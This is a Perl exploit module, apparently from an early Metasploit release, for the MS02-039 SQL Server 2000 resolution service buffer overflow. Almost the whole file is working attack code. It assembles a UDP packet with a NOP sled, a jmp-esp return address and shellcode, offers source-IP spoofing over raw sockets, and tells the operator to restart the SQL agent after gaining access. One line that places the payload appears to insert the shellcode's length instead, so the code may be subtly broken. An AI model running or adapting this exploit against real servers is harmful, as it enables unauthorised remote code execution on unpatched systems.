package Msf::Exploit::mssql2000_resolution;
use base "Msf::Exploit";
use Pex::RawSocket;
use Pex::RawPackets;
use strict;

my $advanced = 
{ 
  'SpoofUDPIP'   => [0, 'The IP address to spoof the exploit packet from'],
};

my $info =
{
    'Name'  => 'MSSQL 2000 Resolution Overflow',
    'Version'  => '$Revision: 1.18 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 1434],
                },
    'AutoOpts' => { 'EXITFUNC' => 'process' },
    'Payload'  => {
                 'Space'  => 512,
                 'BadChars'  => "\x00\x3a\x0a\x0d\x2f\x5c",
               },
    
    'Description'  => qq{
        This is an exploit for the SQL Server 2000 resolution
        service buffer overflow. This overflow is triggered by
        sending a udp packet to port 1434 which starts with 0x04 and
        is followed by long string terminating with a colon and a
        number. This module should work against any vulnerable SQL
        Server 2000 or MSDE install (pre-SP3).   
    },         
    'Refs'  =>  [  
                    'http://www.osvdb.org/878',
                    'http://www.microsoft.com/technet/security/bulletin/MS02-039.mspx'
                ],
    'DefaultTarget' => 0,
    'Targets' => [['Windows 2000',   0x42b48774]],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}


sub Check {
    my $self = shift;
    my %r = Pex::MSSQL::Ping($self->GetVar('RHOST'), $self->GetVar('RPORT'));
    
    if (! keys(%r)) {
        $self->PrintLine("[*] No response recieved from SQL server");
        return(0);
    }
    
    $self->PrintLine("SQL Server '". $r{'ServerName'} ."' on port ". $r{'tcp'});
    return(1);
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');    
    my $shellcode   =$self->GetVar('EncodedPayload')->Payload;
    
    my $target = $self->Targets->[$target_idx];

    $self->PrintLine(sprintf("[*] Trying target %s with return address 0x%.8x", $target->[0], $target->[1]));
    
    # automatically restart sql server - thanks SK!
    $self->PrintLine("[*] Execute 'net start sqlserveragent' once access is obtained"); 

    # \x68:888 => push dword 0x3838383a
    my $request = "\x04" . ("\x90" x 800) . "\x68:888" . "\x90" . $shellcode;
    
    # return address of jmp esp
    substr($request, 97, 4, pack("V", $target->[1]));
    
    # takes us right here, with 8 bytes available
    substr($request, 101, 8, "\xeb\x69\xeb\x69");
    
    # write to thread storage space ala msrpc
    substr($request, 109, 4, pack("V", 0x7ffde0cc));
    substr($request, 113, 4, pack("V", 0x7ffde0cc));
    
    # the payload starts here
    substr($request, 117, 100, "\x90" x 100);
    substr($request, 217, length($shellcode), length($shellcode));
     
     
    if (my $src = $self->GetVar('SpoofUDPIP')) {
        my $s = Pex::RawSocket->new();
        if (! $s) {
            $self->PrintLine("[*] Error creating raw socket: $!");
            return;
        }
    
        $self->PrintLine("[*] Sending spoofed packet from $src to $target_host");
        
        my $x = Pex::RawPackets->new('UDP');
        $x->ip_src_ip($src);
        $x->ip_dest_ip($target_host);
        $x->udp_dest_port($target_port);
        $x->udp_src_port(rand()*65535);
        $x->udp_data($request);    
        $s->send($x->Encode, $target_host);
    } else {
        my $s = Msf::Socket->new();
        if (! $s->Udp($target_host, $target_port)) {
            $self->PrintLine("");
            $self->PrintLine("[*] Could not create udp socket to target:" . $s->Error());
            return;
        }
        $s->Send($request); 
    }    
    
    sleep(2);
    return;
}


